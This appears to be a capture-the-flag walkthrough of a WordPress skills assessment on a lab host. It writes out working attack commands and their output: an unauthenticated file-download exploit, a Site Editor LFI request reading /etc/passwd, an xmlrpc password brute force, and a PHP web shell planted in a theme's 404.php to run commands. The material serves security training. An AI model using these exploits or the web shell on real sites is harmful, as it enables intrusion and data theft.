# Skills Assessment - WordPress

## Identify the WordPress version number.
```shell
curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'

<meta name="generator" content="WordPress 5.3.3" />
```

## Identify the WordPress theme in use.
```shell
curl -s -X GET http://blog.inlanefreight.local | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
http://blog.inlanefreight.local/wp-content/themes/twentynineteen/print.css?ver=1.3
<body class="home blog wp-custom-logo wp-embed-responsive tribe-no-js page-template-var-www-blog-inlanefreight-local-public_html-wp-content-themes-twentynineteen-page-php hfeed image-filters-enabled">
```        

## Submit the contents of the flag file in the directory with directory listing enabled.
``` shell
curl -sXGET http://blog.inlanefreight.local/wp-content/uploads/ | html2text
****** Index of /wp-content/uploads ******
[[ICO]]       Name             Last modified    Size Description
===========================================================================
[[PARENTDIR]] Parent Directory                     -  
[[DIR]]       2020/            2020-09-08 13:30    -  
[[DIR]]       2024/            2024-01-19 05:19    -  
[[DIR]]       2026/            2026-04-20 15:04    -  
[[DIR]]       siteeditor/      2020-09-08 13:49    -  
[[TXT]]       upload_flag.txt  2020-09-08 13:56   32  
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.local Port 80
```

ou sinon 
voir le WP_dirbusting avec dirbuster
en cli avec ffuf / gobuster ou dirb > non trouvé

## Identify the only non-admin WordPress user. (Format: <first-name> <last-name>)
``` shell
wpscan --url http://blog.inlanefreight.local/ --enumerate --api-token cBsXg7.........
[...]
[i] User(s) Identified:

[+] erika
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Charlie Wiggins
 | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
```

## Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.
``` shell
[i] Plugin(s) Identified:

[+] email-subscribers
 | Location: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/
 | Last Updated: 2026-04-16T06:30:00.000Z
 | [!] The version is out of date, the latest version is 5.9.23
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 34 vulnerabilities identified:
[...]
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
```

```shell
┌──(kali㉿kali)-[/usr/share/exploitdb]
└─$ searchsploit email subscribers
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
WordPress Plugin Email Subscribers & Newsletters 3.4.7 - Information Disclosure                                                                                                     | php/webapps/43872.html
WordPress Plugin Email Subscribers & Newsletters 4.2.2 - 'hash' SQL Injection (Unauthenticated)                                                                                     | php/webapps/48699.sh
WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download                                                                                              | php/webapps/48698.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results


┌──(kali㉿kali)-[~]
└─$ searchsploit -p 48698  
  Exploit: WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download
      URL: https://www.exploit-db.com/exploits/48698
     Path: /usr/share/exploitdb/exploits/php/webapps/48698.txt
    Codes: CVE-2019-19985
 Verified: False
File Type: ASCII text
Copied EDB-ID #48698's path to the clipboard
                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/exploitdb/exploits/php/webapps/48698.txt
# Exploit Title: WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download
# Google Dork: "Stable tag" inurl:wp-content/plugins/email-subscribers/readme.txt
# Date: 2020-07-20
# Exploit Author: KBA@SOGETI_ESEC
# Vendor Homepage: https://www.icegram.com/email-subscribers/
# Software Link: https://pluginarchive.com/wordpress/email-subscribers/v/4-2-2
# Version: <= 4.2.2
# Tested on: Email Subscribers & Newsletters 4.2.2
# CVE : CVE-2019-19985

 ################################################################################################
 #             ___         ___         ___         ___      ___                                 #
 #            /\  \       /\  \       /\  \       /\  \    /\  \        ___                     #
 #           /::\  \     /::\  \     /::\  \     /::\  \   \:\  \      /\  \                    #
 #          /:/\ \  \   /:/\:\  \   /:/\:\  \   /:/\:\  \   \:\  \     \:\  \                   #
 #         _\:\~\ \  \ /:/  \:\  \ /:/  \:\  \ /::\~\:\  \  /::\  \    /::\__\                  #
 #        /\ \:\ \ \__/:/__/ \:\__/:/__/_\:\__/:/\:\ \:\__\/:/\:\__\__/:/\/__/                  #
 #        \:\ \:\ \/__\:\  \ /:/  \:\  /\ \/__\:\~\:\ \/__/:/  \/__/\/:/  /                     #
 #         \:\ \:\__\  \:\  /:/  / \:\ \:\__\  \:\ \:\__\/:/  /    \::/__/                      #
 #          \:\/:/  /   \:\/:/  /   \:\/:/  /   \:\ \/__/\/__/      \:\__\                      #
 #           \::/  /     \::/  /     \::/  /     \:\__\              \/__/                      #
 #            \/__/       \/__/       \/__/       \/__/                                         #
 #                                                 ___         ___         ___         ___      #
 #                                                /\  \       /\  \       /\  \       /\  \     #
 #                                               /::\  \     /::\  \     /::\  \     /::\  \    #
 #                EXPLOIT                       /:/\:\  \   /:/\ \  \   /:/\:\  \   /:/\:\  \   #
 # Email Subscribers & Newsletters <= 4.2.2    /::\~\:\  \ _\:\~\ \  \ /::\~\:\  \ /:/  \:\  \  #
 #   Unauthenticated File Download            /:/\:\ \:\__/\ \:\ \ \__/:/\:\ \:\__/:/__/ \:\__\ #
 #                                            \:\~\:\ \/__\:\ \:\ \/__\:\~\:\ \/__\:\  \  \/__/ #
 #                                             \:\ \:\__\  \:\ \:\__\  \:\ \:\__\  \:\  \       #
 #                                              \:\ \/__/   \:\/:/  /   \:\ \/__/   \:\  \      #
 #                                               \:\__\      \::/  /     \:\__\      \:\__\     #
 #                                    KBAZ        \/__/       \/__/       \/__/       \/__/     #
 #                                                                                              #
 #                                                                                              #
 ################################################################################################


curl [BASE_URL]'/wp-admin/admin.php?page=download_report&report=users&status=all'
EXAMPLE: curl 'http://127.0.0.1/wp-admin/admin.php?page=download_report&report=users&status=all'   

┌──(kali㉿kali)-[~]
└─$ searchsploit -x 48698
[...]
curl [BASE_URL]'/wp-admin/admin.php?page=download_report&report=users&status=all'
EXAMPLE: curl 'http://127.0.0.1/wp-admin/admin.php?page=download_report&report=users&status=all'


┌──(kali㉿kali)-[~]
└─$ curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
"admin@inlanefreight.local", "HTB{}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
"admin@inlanefreight.local", "HTB{}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
```

## What is the version number of the plugin vulnerable to an LFI?
``` shell
[+] site-editor
 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
```


## Use the LFI to identify a system user whose name starts with the letter "f".
```shell
┌──(kali㉿kali)-[~]
└─$ searchsploit site editor 1.1.1
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                                              | php/webapps/25493.txt
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                                                                                                                           | php/webapps/44340.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ searchsploit -p php/webapps/44340.txt
  Exploit: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/44340
     Path: /usr/share/exploitdb/exploits/php/webapps/44340.txt
    Codes: CVE-2018-7422
 Verified: True
File Type: Unicode text, UTF-8 text
Copied EDB-ID #44340's path to the clipboard


┌──(kali㉿kali)-[~]
└─$ curl http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
erika:x:1001:1001::/home/erika:/bin/bash
frank.toto:x:1002:1002::/home/frank.toto:/bin/bash
pollinate:x:103:1::/var/cache/pollinate:/bin/false
landscape:x:112:105::/var/lib/landscape:/usr/sbin/nologin
{"success":true,"data":{"output":[]}}                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ curl http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd | grep ^f
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1789 100   1789   0      0  10165      0                              0
frank.toto:x:1002:1002::/home/frank.toto:/bin/bash

```

## Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.
```shell
sudo wpscan --password-attack xmlrpc -t 20 --usernames erika --passwords /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local/
[...]
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - erika / toto                                                                                                                                                                                            
Trying erika / ashley1 Time: 00:00:19 <                                                                                                                                       > (700 / 14345092)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: erika, Password: toto

```

logon http://blog.inlanefreight.local/wp-login.php avec `erika`
theme Twenty Seventeen
404 avec 
```php
<?php

system($_GET['cmd']);
```

```shell
┌──(kali㉿kali)-[~]
└─$ curl http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20-al%20/home/erika     
total 24
drwxr-xr-x 2 erika erika 4096 Sep  8  2020 .
drwxr-xr-x 5 root  root  4096 Sep  8  2020 ..
-rw-r--r-- 1 erika erika  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 erika erika 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 erika erika  655 May 16  2017 .profile
-rw-r--r-- 1 root  root    26 Sep  8  2020 _flag.txt
                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ curl http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/erika/_flag.txt
HTB{}
```
